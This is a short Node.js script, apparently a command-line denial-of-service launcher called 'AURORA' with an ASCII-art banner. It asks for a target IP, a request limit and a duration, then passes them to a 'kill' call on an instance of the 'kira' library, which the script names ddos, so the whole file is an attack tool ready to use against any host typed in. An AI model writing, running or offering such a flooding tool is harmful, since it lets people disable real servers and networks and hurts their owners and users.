const { clear } = require("console");
const Kira = require("kira");
const ddos = new Kira();
const prompts = require("prompts");

clear();

console.log("                                                        ");
console.log(" ▄▄▄       █    ██  ██▀███   ▒█████   ██▀███   ▄▄▄      ");
console.log("▒████▄     ██  ▓██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ");
console.log("▒██  ▀█▄  ▓██  ▒██░▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ");
console.log("░██▄▄▄▄██ ▓▓█  ░██░▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ ");
console.log(" ▓█   ▓██▒▒▒█████▓ ░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒");
console.log(" ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░");
console.log("  ▒   ▒▒ ░░░▒░ ░ ░   ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░");
console.log("  ░   ▒    ░░░ ░ ░   ░░   ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   ");
console.log("      ░  ░   ░        ░         ░ ░     ░           ░  ░");
console.log("                                                        ");

(async () => {
  const response = await prompts([
    {
      type: "text",
      name: "targetIp",
      message: `Target IP: `,
    },
    {
      type: "number",
      name: "maxLimit",
      message: `Max Limit: `,
    },
    {
      type: "number",
      name: "length",
      message: `Length: `,
    },
  ]);
  ddos.kill(`${response.targetIp}`, response.maxLimit, response.length);
})();
